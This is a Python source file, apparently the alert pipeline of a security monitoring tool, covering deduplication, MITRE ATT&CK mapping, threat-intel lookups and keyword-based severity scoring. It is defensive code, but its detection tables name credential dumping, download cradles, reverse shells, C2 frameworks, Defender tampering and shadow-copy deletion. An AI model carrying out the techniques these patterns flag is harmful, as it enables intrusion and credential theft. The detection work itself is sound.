import json
import os
import re
import time
import random
import hashlib
import threading
import socket
from datetime import datetime
from collections import deque, defaultdict

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ─────────────────────────────────────────────────────────────
# CONFIG — keys loaded from environment variables ONLY.
# Never hardcode secrets in source files.
#
# Set these before running (Windows PowerShell):
#   $env:VT_API_KEY    = "your_virustotal_key"
#   $env:ABUSE_API_KEY = "your_abuseipdb_key"
#
# Or create a .env file at project root (add .env to .gitignore):
#   VT_API_KEY=your_virustotal_key
#   ABUSE_API_KEY=your_abuseipdb_key
#
# If keys are absent, threat-intel enrichment is skipped gracefully
# and the rest of the pipeline still works normally.
# ─────────────────────────────────────────────────────────────

def _load_dotenv():
    """Load .env file without requiring python-dotenv package."""
    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), ".env")
    if not os.path.exists(env_path):
        return
    with open(env_path, encoding="utf-8", errors="ignore") as _f:
        for line in _f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, _, v = line.partition("=")
            os.environ.setdefault(k.strip(), v.strip())

_load_dotenv()

VT_API_KEY    = os.environ.get("VT_API_KEY",    "")
ABUSE_API_KEY = os.environ.get("ABUSE_API_KEY", "")

if not VT_API_KEY:
    print("[CONFIG] WARNING: VT_API_KEY not set — VirusTotal enrichment disabled")
if not ABUSE_API_KEY:
    print("[CONFIG] WARNING: ABUSE_API_KEY not set — AbuseIPDB enrichment disabled")

FLASK_API = "http://127.0.0.1:5000/api/add_sysmon_alert"  # legacy / unused

DATA_DIR      = "data"
ALERT_FILE    = os.path.join(DATA_DIR, "alerts.json")
CASE_FILE     = os.path.join(DATA_DIR, "cases.json")
INCIDENT_FILE = os.path.join(DATA_DIR, "incidents.json")
TIMELINE_FILE = os.path.join(DATA_DIR, "timeline.json")

MAX_ALERTS    = 1000
MAX_CASES     = 300
MAX_INCIDENTS = 300
MAX_TIMELINE  = 500

DEDUP_TTL     = 3      # seconds before same alert can re-fire (3s dedup prevents burst spam while allowing real-time testing)
CHAIN_WINDOW  = 300    # 5-minute rolling window for correlation
CHAIN_MIN_SCORE = 130  # minimum chain score to declare attack
INCIDENT_THRESHOLD = 3 # HIGH/CRITICAL alerts per host → incident
INCIDENT_WINDOW    = 600  # 10 minutes

os.makedirs(DATA_DIR, exist_ok=True)
for _f in [ALERT_FILE, CASE_FILE, INCIDENT_FILE, TIMELINE_FILE]:
    if not os.path.exists(_f):
        with open(_f, "w") as _fp:
            json.dump([], _fp)

# ─────────────────────────────────────────────────────────────
# THREAD SAFETY
# ─────────────────────────────────────────────────────────────

_file_lock  = threading.Lock()
_dedup_lock = threading.Lock()
_chain_lock = threading.Lock()

# ─────────────────────────────────────────────────────────────
# FILE HELPERS
# ─────────────────────────────────────────────────────────────

def _load(path: str) -> list:
    with _file_lock:
        try:
            with open(path, "r", encoding="utf-8") as f:
                d = json.load(f)
                return d if isinstance(d, list) else []
        except Exception:
            return []

def _save(path: str, data: list, limit: int = 1000):
    with _file_lock:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data[:limit], f, indent=2, ensure_ascii=False)

def _append(path: str, item: dict, limit: int = 1000):
    data = _load(path)
    data.insert(0, item)
    _save(path, data, limit)

# Custom rules built through the frontend's Custom Rules page
# (data/custom_rules.json, managed via /api/rules/custom in app.py).
# calculate_severity() (Signal 20) reads these through _load_custom_rules()
# below, which caches by file mtime — calculate_severity runs on every
# single alert, so re-reading and re-parsing this file from disk every
# time would be wasteful; it only actually re-reads when the file has
# changed since the last check.
CUSTOM_RULES_FILE = os.path.join(DATA_DIR, "custom_rules.json")
_custom_rules_cache = {"mtime": 0.0, "size": -1, "rules": []}

def _load_custom_rules() -> list:
    try:
        stat = os.stat(CUSTOM_RULES_FILE)
        mtime = stat.st_mtime
        size = stat.st_size
    except OSError:
        return []
    if mtime != _custom_rules_cache.get("mtime") or size != _custom_rules_cache.get("size"):
        _custom_rules_cache["rules"] = _load(CUSTOM_RULES_FILE)
        _custom_rules_cache["mtime"] = mtime
        _custom_rules_cache["size"] = size
    return _custom_rules_cache["rules"]

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 1 — DEDUPLICATION
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

_dedup_cache: dict = {}

def _is_duplicate(event: str, detail: str) -> bool:
    """
    MD5 fingerprint of event+detail.
    Returns True (block) if same alert fired within DEDUP_TTL seconds.
    Also auto-prunes cache every 500 entries.
    """
    key = hashlib.md5(f"{event}{str(detail)[:80]}".encode()).hexdigest()
    now = time.time()
    with _dedup_lock:
        if now - _dedup_cache.get(key, 0) < DEDUP_TTL:
            return True
        _dedup_cache[key] = now
        if len(_dedup_cache) > 500:
            cutoff  = now - DEDUP_TTL * 2
            expired = [k for k, t in _dedup_cache.items() if t < cutoff]
            for k in expired:
                del _dedup_cache[k]
    return False

def _is_real_alert(alert: dict) -> bool:
    """Returns True if this is a real detection alert (not RSP/SMOKE/system)."""
    aid = alert.get('id', '') or ''
    return not aid.startswith('RSP-') and not aid.startswith('SMOKE-')

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 2 — MITRE ATT&CK MAPPING
#   80+ keyword → (technique_id, technique_name, tactic, url)
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

_MITRE_BASE = "https://attack.mitre.org/techniques/"

# Format: keyword → (id, name, tactic)
# Longest keyword match wins — avoids false short matches
MITRE_TABLE = {
    # Initial Access
    "spearphishing":          ("T1566.001","Spearphishing Attachment",        "Initial Access"),
    "phishing":               ("T1566",    "Phishing",                        "Initial Access"),
    "drive-by":               ("T1189",    "Drive-by Compromise",             "Initial Access"),
    "usb":                    ("T1091",    "Replication via Removable Media",  "Initial Access"),
    "supply chain":           ("T1195",    "Supply Chain Compromise",          "Initial Access"),
    "exploit public":         ("T1190",    "Exploit Public-Facing Application","Initial Access"),

    # Execution
    "powershell":             ("T1059.001","PowerShell",                       "Execution"),
    "cmd.exe":                ("T1059.003","Windows Command Shell",            "Execution"),
    "wscript":                ("T1059.005","Visual Basic Script",              "Execution"),
    "cscript":                ("T1059.005","Visual Basic Script",              "Execution"),
    "msbuild":                ("T1127.001","MSBuild",                          "Execution"),
    "wmic process call create":("T1047",   "WMI Process Creation",             "Execution"),
    "wmic":                   ("T1047",    "Windows Management Instrumentation","Execution"),
    "schtasks /create":       ("T1053.005","Scheduled Task",                   "Execution"),
    "schtasks":               ("T1053.005","Scheduled Task",                   "Execution"),
    "msiexec":                ("T1218.007","Msiexec",                          "Execution"),
    "mshta":                  ("T1218.005","Mshta",                            "Execution"),

    # Persistence
    "currentversion\\run":    ("T1547.001","Registry Run Keys",                "Persistence"),
    "runonce":                ("T1547.001","Registry RunOnce",                  "Persistence"),
    "winlogon\\shell":        ("T1547.004","Winlogon Helper DLL",              "Persistence"),
    "winlogon\\userinit":     ("T1547.004","Winlogon Helper DLL",              "Persistence"),
    "appinit_dlls":           ("T1546.010","AppInit DLLs",                     "Persistence"),
    "image file execution":   ("T1546.012","Image File Execution Options",     "Persistence"),
    "startup folder":         ("T1547.001","Startup Folder",                   "Persistence"),
    "new service":            ("T1543.003","Windows Service",                  "Persistence"),
    "wmi subscription":       ("T1546.003","WMI Event Subscription",           "Persistence"),

    # Privilege Escalation
    "token::elevate":         ("T1134.001","Token Impersonation/Theft",        "Privilege Escalation"),
    "getsystem":              ("T1134.001","Token Impersonation",              "Privilege Escalation"),
    "fodhelper":              ("T1548.002","Bypass UAC via Fodhelper",         "Privilege Escalation"),
    "eventvwr":               ("T1548.002","Bypass UAC via Eventvwr",          "Privilege Escalation"),
    "uac bypass":             ("T1548.002","Bypass User Account Control",      "Privilege Escalation"),
    "ms-settings\\shell":     ("T1548.002","Bypass UAC via ms-settings",       "Privilege Escalation"),

    # Defense Evasion
    "frombase64string":       ("T1027",    "Obfuscated Files or Information",  "Defense Evasion"),
    "-encodedcommand":        ("T1027",    "Obfuscated Command Line",          "Defense Evasion"),
    "-enc ":                  ("T1027",    "Obfuscated Command Line",          "Defense Evasion"),
    "amsibypass":             ("T1562.001","Disable or Modify Tools (AMSI)",   "Defense Evasion"),
    "disablerealtimemonitoring":("T1562.001","Disable Defender RT Monitoring", "Defense Evasion"),
    "set-mppreference":       ("T1562.001","Modify Defender Settings",         "Defense Evasion"),
    "wevtutil cl":            ("T1070.001","Clear Windows Event Logs",         "Defense Evasion"),
    "clear-eventlog":         ("T1070.001","Clear Windows Event Logs",         "Defense Evasion"),
    "timestomp":              ("T1070.006","Timestomp",                        "Defense Evasion"),
    "rundll32":               ("T1218.011","Rundll32",                         "Defense Evasion"),
    "regsvr32":               ("T1218.010","Regsvr32",                         "Defense Evasion"),
    "certutil -decode":       ("T1140",    "Deobfuscate via Certutil",         "Defense Evasion"),
    "certutil -urlcache":     ("T1105",    "Ingress Tool via Certutil",        "Defense Evasion"),
    "process hollow":         ("T1055.012","Process Hollowing",                "Defense Evasion"),
    "reflective":             ("T1055.001","Reflective DLL Injection",         "Defense Evasion"),
    "createremotethread":     ("T1055",    "Process Injection",                "Defense Evasion"),
    "writeprocessmemory":     ("T1055",    "Process Injection",                "Defense Evasion"),
    "injection":              ("T1055",    "Process Injection",                "Defense Evasion"),

    # Credential Access
    "sekurlsa":               ("T1003.001","LSASS Memory (sekurlsa)",          "Credential Access"),
    "lsadump":                ("T1003.001","LSASS Dump",                       "Credential Access"),
    "mimikatz":               ("T1003.001","OS Credential Dumping (Mimikatz)", "Credential Access"),
    "invoke-mimikatz":        ("T1003.001","OS Credential Dumping (PS)",       "Credential Access"),
    "procdump":               ("T1003.001","LSASS Dump via ProcDump",          "Credential Access"),
    "comsvcs.dll":            ("T1003.001","LSASS Dump via comsvcs",           "Credential Access"),
    "ntds.dit":               ("T1003.003","NTDS Domain Credential Dump",      "Credential Access"),
    "hashdump":               ("T1003",    "OS Credential Dumping",            "Credential Access"),
    "kerberoast":             ("T1558.003","Kerberoasting",                    "Credential Access"),
    "invoke-kerberoast":      ("T1558.003","Kerberoasting (PS)",               "Credential Access"),
    "lazagne":                ("T1555",    "Credentials from Password Stores", "Credential Access"),
    "nanodump":               ("T1003.001","LSASS Dump via NanoDump",          "Credential Access"),
    "wdigest":                ("T1003.001","WDigest Credential Access",        "Credential Access"),
    "lsass":                  ("T1003.001","LSASS Memory Access",              "Credential Access"),

    # Discovery
    "whoami":                 ("T1033",    "System Owner/User Discovery",      "Discovery"),
    "systeminfo":             ("T1082",    "System Information Discovery",     "Discovery"),
    "ipconfig":               ("T1016",    "System Network Configuration",     "Discovery"),
    "netstat":                ("T1049",    "System Network Connections",       "Discovery"),
    "net user":               ("T1087",    "Account Discovery",                "Discovery"),
    "net localgroup":         ("T1069",    "Permission Groups Discovery",      "Discovery"),
    "arp -a":                 ("T1016",    "ARP Table Enumeration",            "Discovery"),
    "route print":            ("T1016",    "Routing Table Enumeration",        "Discovery"),
    "nltest":                 ("T1482",    "Domain Trust Discovery",           "Discovery"),
    "tasklist":               ("T1057",    "Process Discovery",                "Discovery"),
    "sharphound":             ("T1087",    "AD Account Discovery (SharpHound)","Discovery"),
    "bloodhound":             ("T1087",    "AD Attack Path (BloodHound)",      "Discovery"),
    "reg query":              ("T1012",    "Query Registry",                   "Discovery"),

    # Lateral Movement
    "psexec":                 ("T1569.002","Service Execution (PsExec)",       "Lateral Movement"),
    "wmiexec":                ("T1047",    "WMI Remote Execution",             "Lateral Movement"),
    "\\admin$":               ("T1021.002","SMB Admin Share",                  "Lateral Movement"),
    "\\c$":                   ("T1021.002","SMB C$ Share",                     "Lateral Movement"),
    "rdp":                    ("T1021.001","Remote Desktop Protocol",          "Lateral Movement"),
    "pass-the-hash":          ("T1550.002","Pass the Hash",                    "Lateral Movement"),
    "kerberos::ptt":          ("T1550.003","Pass the Ticket",                  "Lateral Movement"),
    "invoke-command":         ("T1021",    "PS Remote Command",                "Lateral Movement"),
    "enter-pssession":        ("T1021",    "PS Remote Session",                "Lateral Movement"),

    # Command and Control
    "meterpreter":            ("T1095",    "Non-App Layer Protocol (Meterp)",  "Command & Control"),
    "cobalt strike":          ("T1071",    "Cobalt Strike C2",                 "Command & Control"),
    "beacon":                 ("T1071",    "C2 Application Layer Protocol",    "Command & Control"),
    "covenant":               ("T1071",    "Covenant C2 Framework",            "Command & Control"),
    "sliver":                 ("T1071",    "Sliver C2 Framework",              "Command & Control"),
    "empire":                 ("T1071",    "Empire C2 Framework",              "Command & Control"),
    "downloadstring":         ("T1105",    "Ingress Tool via DownloadString",  "Command & Control"),
    "downloadfile":           ("T1105",    "Ingress Tool via DownloadFile",    "Command & Control"),
    "invoke-webrequest":      ("T1105",    "Ingress Tool via IWR",             "Command & Control"),
    "net.webclient":          ("T1105",    "Ingress Tool via WebClient",       "Command & Control"),
    "bitsadmin":              ("T1197",    "BITS Job Abuse",                   "Command & Control"),
    "raw.githubusercontent":  ("T1105",    "GitHub Raw Download Cradle",       "Command & Control"),
    "pastebin":               ("T1102",    "Web Service C2 (Pastebin)",        "Command & Control"),
    "dnscat":                 ("T1048",    "DNS Tunneling (DNSCat)",           "Command & Control"),
    "ngrok":                  ("T1572",    "Protocol Tunneling (Ngrok)",       "Command & Control"),
    "chisel":                 ("T1572",    "Protocol Tunneling (Chisel)",      "Command & Control"),
    "4444":                   ("T1071.001","C2 on Port 4444 (Metasploit)",     "Command & Control"),
    "31337":                  ("T1071.001","C2 on Port 31337 (Elite RAT)",     "Command & Control"),
    "1337":                   ("T1071.001","C2 on Port 1337 (Backdoor)",       "Command & Control"),

    # Exfiltration
    "exfil":                  ("T1041",    "Exfiltration Over C2 Channel",     "Exfiltration"),
    "dns exfil":              ("T1048",    "DNS Exfiltration",                  "Exfiltration"),
    "send-mailmessage":       ("T1048",    "Email Exfiltration (PS)",          "Exfiltration"),

    # Impact
    "vssadmin delete shadows":("T1490",    "Inhibit Recovery (VSS Delete)",    "Impact"),
    "wmic shadowcopy delete": ("T1490",    "Inhibit Recovery (WMI Shadow)",    "Impact"),
    "bcdedit /set":           ("T1490",    "Inhibit Recovery (bcdedit)",       "Impact"),
    "wbadmin delete catalog": ("T1490",    "Inhibit Recovery (wbadmin)",       "Impact"),
    "ransomware":             ("T1486",    "Data Encrypted for Impact",        "Impact"),
    ".crypt":                 ("T1486",    "Ransomware File Extension",        "Impact"),
    ".locked":                ("T1486",    "Ransomware File Extension",        "Impact"),
    ".wncry":                 ("T1486",    "WannaCry Ransomware",              "Impact"),
    "readme_decrypt":         ("T1486",    "Ransom Note Dropped",              "Impact"),
    "wipe":                   ("T1485",    "Data Destruction",                 "Impact"),
}

def map_mitre(event: str, detail: str, override: dict | None = None) -> dict:
    """Longest-keyword-match wins. Returns full MITRE dict.

    `override` lets a source that already KNOWS the correct MITRE mapping
    (Wazuh tags most of its rules with rule.mitre.id/tactic natively — that's
    more reliable than us guessing from keywords) skip the guess entirely.
    Same shape as this function's normal return value; any missing key
    falls back to the keyword-matched value.
    """
    text     = (event + " " + detail).lower()
    best_key = None
    best_len = 0
    for kw, (mid, mname, mtactic) in MITRE_TABLE.items():
        if kw in text and len(kw) > best_len:
            best_key = kw
            best_len = len(kw)
    if best_key:
        mid, mname, mtactic = MITRE_TABLE[best_key]
        url = _MITRE_BASE + mid.replace(".", "/") + "/"
        guessed = {"mitre_id": mid, "mitre_name": mname,
                   "mitre_tactic": mtactic, "mitre_url": url}
    else:
        guessed = {"mitre_id": "T0000", "mitre_name": "Unknown Technique",
                   "mitre_tactic": "Unknown", "mitre_url": "https://attack.mitre.org/"}

    if override:
        merged = dict(guessed)
        merged.update({k: v for k, v in override.items() if v})
        if override.get("mitre_id") and not override.get("mitre_url"):
            merged["mitre_url"] = _MITRE_BASE + override["mitre_id"].replace(".", "/") + "/"
        return merged
    return guessed

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 3 — THREAT INTELLIGENCE ENRICHMENT
#   Real APIs: VirusTotal + AbuseIPDB + ip-api.com (free geo)
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

_PRIVATE_PREFIXES = (
    "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.",
    "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
    "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
    "127.", "0.", "::1", "fc00:", "fe80:",
)

_ip_cache: dict = {}   # ip → enriched dict (avoids repeated API calls)

def _extract_ip(text: str) -> str | None:
    """Extract first public IP from alert text."""
    matches = re.findall(
        r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',
        str(text)
    )
    for ip in matches:
        if not any(ip.startswith(p) for p in _PRIVATE_PREFIXES):
            return ip
    return None

def _vt_lookup(ip: str) -> int:
    """VirusTotal IP reputation. Returns malicious+suspicious count."""
    if not REQUESTS_OK or not VT_API_KEY:
        return 0
    try:
        r = requests.get(
            f"https://www.virustotal.com/api/v3/ip_addresses/{ip}",
            headers={"x-apikey": VT_API_KEY},
            timeout=8
        )
        if r.status_code != 200:
            return 0
        stats = r.json()["data"]["attributes"]["last_analysis_stats"]
        return stats.get("malicious", 0) + stats.get("suspicious", 0)
    except Exception:
        return 0

def _abuse_lookup(ip: str) -> int:
    """AbuseIPDB confidence score 0–100."""
    if not REQUESTS_OK or not ABUSE_API_KEY:
        return 0
    try:
        r = requests.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": ABUSE_API_KEY, "Accept": "application/json"},
            params={"ipAddress": ip, "maxAgeInDays": 90},
            timeout=8
        )
        if r.status_code != 200:
            return 0
        return r.json()["data"]["abuseConfidenceScore"]
    except Exception:
        return 0

def _geo_lookup(ip: str) -> dict:
    """Geo lookup via multi-provider + Chennai LAN fallback."""
    if not ip or ip in ("-", "localhost", "127.0.0.1", "::1"):
        return {"country": "India (Corporate LAN)", "city": "Chennai", "isp": "SentinelX Local Node",
                "is_proxy": False, "is_hosting": False}
    try:
        import ipaddress
        if ipaddress.ip_address(ip).is_private:
            return {"country": "India (Corporate LAN)", "city": "Chennai", "isp": "Corporate LAN",
                    "is_proxy": False, "is_hosting": False}
    except Exception:
        pass

    if not REQUESTS_OK:
        return {"country": "-", "city": "-", "isp": "-", "is_proxy": False, "is_hosting": False}
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy,hosting",
            timeout=4
        )
        d = r.json()
        if d.get("status") == "success":
            return {
                "country": d.get("country", "-"),
                "city":    d.get("city",    "-"),
                "isp":     d.get("isp",     "-"),
                "is_proxy":    d.get("proxy",   False),
                "is_hosting":  d.get("hosting", False),
            }
    except Exception:
        pass

    try:
        r2 = requests.get(f"https://ipwhois.app/json/{ip}", timeout=4)
        d2 = r2.json()
        if d2.get("success") is True:
            return {
                "country": d2.get("country", "-"),
                "city":    d2.get("city",    "-"),
                "isp":     d2.get("isp",     "-"),
                "is_proxy": False,
                "is_hosting": False,
            }
    except Exception:
        pass

    return {"country": "-", "city": "-", "isp": "-",
            "is_proxy": False, "is_hosting": False}

def enrich_threat_intel(detail: str) -> dict:
    """
    Full threat intel enrichment for an alert.
    Extracts IP → VT + AbuseIPDB + Geo → returns enrichment dict.
    Also checks the IP against locally-cached free IOC feeds (ThreatFox/
    URLhaus via integrations/ioc_feeds.py) — this is a second, independent
    signal: VT/AbuseIPDB are per-lookup reactive checks against paid-tier
    APIs, the IOC feeds are proactive bulk data that doesn't touch those
    rate limits at all. Either one alone can miss something; checking both
    is strictly more coverage for the same one extracted IP.
    Caches per-IP to avoid repeat API calls.
    """
    base = {
        "ip": "-", "country": "-", "city": "-", "isp": "-",
        "vt_score": 0, "abuse_score": 0,
        "threat_risk": "LOW", "is_proxy": False, "is_hosting": False,
        "ioc_feed_confidence": 0, "ioc_feed_malware": None, "ioc_feed_source": None,
    }
    ip = _extract_ip(detail)
    if not ip:
        return base
    base["ip"] = ip

    try:
        from integrations.ioc_feeds import check_ioc
        ioc = check_ioc(ip, "ip")
        if ioc.get("match"):
            base["ioc_feed_confidence"] = ioc.get("confidence") or 50
            base["ioc_feed_malware"]    = ioc.get("malware")
            base["ioc_feed_source"]     = ioc.get("source")
    except Exception:
        pass  # IOC feeds are enrichment, never block core threat intel

    if ip in _ip_cache:
        return {**base, **_ip_cache[ip]}

    geo   = _geo_lookup(ip)
    vt    = _vt_lookup(ip)
    abuse = _abuse_lookup(ip)

    # Threat risk from scores
    if vt >= 10 or abuse >= 80:
        risk = "CRITICAL"
    elif vt >= 5 or abuse >= 50:
        risk = "HIGH"
    elif vt >= 1 or abuse >= 20 or geo["is_proxy"] or geo["is_hosting"]:
        risk = "MEDIUM"
    else:
        risk = "LOW"

    enriched = {
        "country":     geo["country"],
        "city":        geo["city"],
        "isp":         geo["isp"],
        "is_proxy":    geo["is_proxy"],
        "is_hosting":  geo["is_hosting"],
        "vt_score":    vt,
        "abuse_score": abuse,
        "threat_risk": risk,
    }
    _ip_cache[ip] = enriched
    return {**base, **enriched}

# ─────────────────────────────────────────────────────────────
# ═════════════════════════════════════════════════════════════
#   STAGE 4 — DYNAMIC RISK SCORING → SEVERITY
#   12 independent signals contribute to final score.
#   Score 0-20=LOW  21-45=MEDIUM  46-70=HIGH  71+=CRITICAL
# ═════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────

# keyword → score contribution
RISK_SIGNALS = {
    # CRITICAL indicators (25–30 each)
    "meterpreter":             30, "mimikatz":              30,
    # Malicious filename keywords — detected by exe_detector filename scoring
    "backdoor":                28, "ransomware":            28,
    "payload":                 22, "dropper":               22,
    "stager":                  22, "implant":               22,
    "trojan":                  22, "rootkit":               28,
    "keylogger":               22, "stealer":               22,
    # Registry persistence keywords
    "autorun":                 20, "currentversion\\run":  25,
    "runonce":                 20, "winlogon":              20,
    "registry persistence":    22, "registry autorun":      22,
    "new registry":            15, "persistence detected":  18,
    # Process ancestry / attack chain keywords
    "attack chain":            25, "multi-stage":           22,
    "ancestry attack":         20, "chain score":           18,
    "process ancestry":        18, "parent-child":          15,
    "invoke-mimikatz":         30, "cobalt strike":         30,
    "shellcode":               28, "reverse_tcp":           28,
    "vssadmin delete shadows": 28, "wmic shadowcopy delete":28,
    ".wncry":                  30, ".crypt":                28,
    ".locked":                 28, "lazagne":               28,
    "invoke-shellcode":        30, "sekurlsa":              28,
    "nanodump":                28, "ntds.dit":              28,
    # HIGH indicators (15–27 each)
    "invoke-kerberoast":       25, "kerberoast":            25,
    "hashdump":                26, "lsass":                 24,
    "procdump":                24, "comsvcs.dll":           26,
    "wdigest":                 22, "amsibypass":            22,
    "disablerealtimemonitoring":20,"4444":                  22,
    "31337":                   24, "9001":                  18,
    "-encodedcommand":         22, "-enc ":                 22,
    "frombase64string":        18, "invoke-expression":     20,
    "iex(":                    20, "invoke-webrequest":     18,
    "downloadstring":          18, "downloadfile":          18,
    "net.webclient":           18, "bypassuac":             20,
    "fodhelper":               18, "eventvwr":              16,
    # MEDIUM indicators (10–17 each)
    "rundll32":                14, "regsvr32":              16,
    "mshta":                   16, "wscript":               12,
    "cscript":                 12, "msbuild":               14,
    "certutil -urlcache":      18, "certutil -decode":      16,
    "bitsadmin /transfer":     16, "psexec":                16,
    "wmiexec":                 16, "\\admin$":              14,
    "\\c$":                    12, "wevtutil cl":           14,
    "clear-eventlog":          14, "schtasks /create":      12,
    "sc create":               12, "reg add":               10,
    "-windowstyle hidden":     14, "-w hidden":             14,
    "bypass":                  10, "reflection.assembly":   14,
    "add-type":                12, "bcdedit /set":          26,
    # LOW indicators (3–9 each)
    "powershell -nop":         10, "net user":               6,
    "net localgroup":           6, "whoami":                 5,
    "systeminfo":               6, "nltest":                 8,
    "netstat":                  5, "net view":               7,
    "net share":                7, "schtasks /query":        6,
    "tasklist":                 4, "ipconfig":               4,
    "arp -a":                   5, "reg query":              5,
    "ping ":                    5,
    # CMD & LOLBin Attack Signals
    "suspicious cmd":          20, "certutil -urlcache":     22,
    "certutil -decode":        20, "bitsadmin /transfer":    20,
    "cipher /w":               28, "format c:":              30,
    "vssadmin delete":         28, "wbadmin delete":         28,
    "netsh advfirewall set":   28, "sc stop windefend":      30,
    "sc delete windefend":     30, "wevtutil cl":            22,
    "fsutil usn deletejournal":24, "reg save hklm":          26,
    "reg add hklm\\software\\microsoft\\windows defender": 30,
    "net localgroup administrators /add": 30,
}

def calculate_severity(event: str, detail: str,
                        vt_score: int = 0,
                        abuse_score: int = 0,
                        ioc_confidence: int = 0) -> tuple[str, int]:
    """
    Scores signals and returns (severity, score).
    """
    text  = (event + " " + detail).lower()
    score = 0

    # Signal 0: Detector Priority Hint
    # When a detector rule explicitly identifies a CRITICAL or HIGH threat,
    # respect that domain assessment so verified attacks reliably reach CRITICAL (71+).
    if "priority : critical" in text or "priority: critical" in text or "priority:critical" in text:
        score += 50
    elif "priority : high" in text or "priority: high" in text or "priority:high" in text:
        score += 30
    elif "priority : medium" in text or "priority: medium" in text or "priority:medium" in text:
        score += 15

    # Signal 1: Keyword risk table
    for kw, w in RISK_SIGNALS.items():
        if kw in text:
            score += w

    # Signal 20: Custom rules built through the Custom Rules UI
    # (data/custom_rules.json, managed via /api/rules/custom in app.py).
    # Scored the exact same way as Signal 1 above — same math, same
    # thresholds — so a rule an analyst builds in the UI actually
    # affects real detection instead of only existing in the browser.
    for rule in _load_custom_rules():
        if rule.get("active", True) and rule.get("keyword") and rule["keyword"] in text:
            score += int(rule.get("score", 0))

    # Signal 21: Free IOC feed match (integrations/ioc_feeds.py —
    # ThreatFox/URLhaus). Independent of Signal 2/3 below — this is a
    # bulk-feed proactive match, not a per-lookup VT/AbuseIPDB result, so
    # an alert can legitimately get credit from both if both happen to
    # agree the same IP is bad.
    if ioc_confidence >= 75: score += 28
    elif ioc_confidence >= 50: score += 18
    elif ioc_confidence > 0: score += 8

    # Signal 2: VirusTotal
    if vt_score >= 10:    score += 25
    elif vt_score >= 5:   score += 15
    elif vt_score >= 1:   score += 8

    # Signal 3: AbuseIPDB
    if abuse_score >= 80: score += 20
    elif abuse_score >= 50: score += 12
    elif abuse_score >= 20: score += 6

    # Signal 4: Encoded command pattern
    if re.search(r'-e(nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{20,}', text):
        score += 25

    # Signal 4b: event/detail explicitly confirms encoding/obfuscation
    if "encoded powershell" in text:   score += 20  # confirmed encoded PS
    elif "encoded" in text:             score += 10
    if "obfuscat" in text:              score += 8

    # Signal 5: Execution from user-writable path
    for sp in ["\\temp\\","\\appdata\\roaming\\","\\public\\",
               "\\programdata\\","\\downloads\\"]:
        if sp in text:
            score += 10
            break

    # Signal 6: Office macro chain
    if any(p in text for p in
           ["winword.exe","excel.exe","outlook.exe","powerpnt.exe","onenote.exe"]):
        score += 20

    # Signal 7: Known C2 port in detail
    if any(p in text for p in ["4444","31337","1337","8888","9001","6667"]):
        score += 18

    # Signal 8: Ransomware indicators
    if any(r in text for r in [".crypt",".locked",".wncry","vssadmin delete",
                                "shadowcopy delete","bcdedit","readme_decrypt"]):
        score += 25

    # Signal 9: Credential dumping
    if any(c in text for c in ["mimikatz","procdump","comsvcs.dll","hashdump",
                                "sekurlsa","ntds.dit","lazagne","wce.exe"]):
        score += 30

    # Signal 10: Process injection
    if any(i in text for i in ["createremotethread","virtualalloc",
                                "writeprocessmemory","shellcode","reflective"]):
        score += 18

    # Signal 11: AMSI / Defender bypass & tampering
    if any(d in text for d in ["amsibypass","disablerealtimemonitoring",
                                "set-mppreference","disableantispyware",
                                "sc stop windefend","sc delete windefend",
                                "sc config windefend"]):
        score += 30

    # Signal 12: Known attack frameworks
    if any(f in text for f in ["cobalt strike","meterpreter","covenant","sliver",
                                "brute ratel","empire","powersploit","rubeus"]):
        score += 25

    # Signal 13: Confirmed multi-hop process ancestry chain (from sysmon_detector)
    # CHAIN_HINT is injected into detail by the detector so that the pipeline
    # (not the detector) owns the severity decision, but the detector can still
    # communicate the chain's risk level as a scored signal.
    if "chain_hint:critical" in text:  score += 40
    elif "chain_hint:high"   in text:  score += 25
    elif "chain_hint:medium" in text:  score += 12

    # Signal 14: EXE risk score from exe_detector.
    # New format: EXE_RISK_SCORE:HIGH/MEDIUM hint in detail
    if "exe_risk_score:high"   in text: score += 30
    elif "exe_risk_score:medium" in text: score += 15
    # Legacy format: "Score  : NN" or "RiskScore: NN" — old exe_detector versions
    _score_match = re.search(r'(?:score|riskscore)\s*[:\-]\s*(\d+)', text)
    if _score_match:
        _raw = int(_score_match.group(1))
        if _raw >= 75:   score += 30
        elif _raw >= 35: score += 15
        elif _raw >= 15: score += 8

    # Signal 15: Network port risk from network_detector / sysmon_network_detector.
    # NET_PORT_RISK is set by both psutil and Sysmon EID 3 paths.
    if "net_port_risk:critical" in text: score += 35
    elif "net_port_risk:high"   in text: score += 20
    elif "net_port_risk:medium" in text: score += 10

    # Signal 16: Registry persistence risk from registry_detector.
    if "registry_risk:critical" in text: score += 30
    elif "registry_risk:high"   in text: score += 18
    elif "registry_risk:medium" in text: score += 8

    # Signal 17: File creation risk from sysmon_file_detector.
    if "file_risk:critical" in text: score += 30
    elif "file_risk:high"   in text: score += 18

    # Signal 22: Real YARA content match (integrations/yara_scanner.py),
    # separate from Signal 17's filename/path heuristic above — a file in
    # a normal location that YARA still flags on content is a different,
    # stronger signal than a suspicious path alone.
    if "yara_risk:critical" in text: score += 32
    elif "yara_risk:high"   in text: score += 20
    elif "yara_risk:medium" in text: score += 10

    # Signal 18: Suricata IDS/IPS alert risk (integrations/suricata_connector.py).
    # Suricata's own severity scale is 1=high/2=medium/3=low (inverted vs.
    # ours) — the connector already normalizes that before this point, so
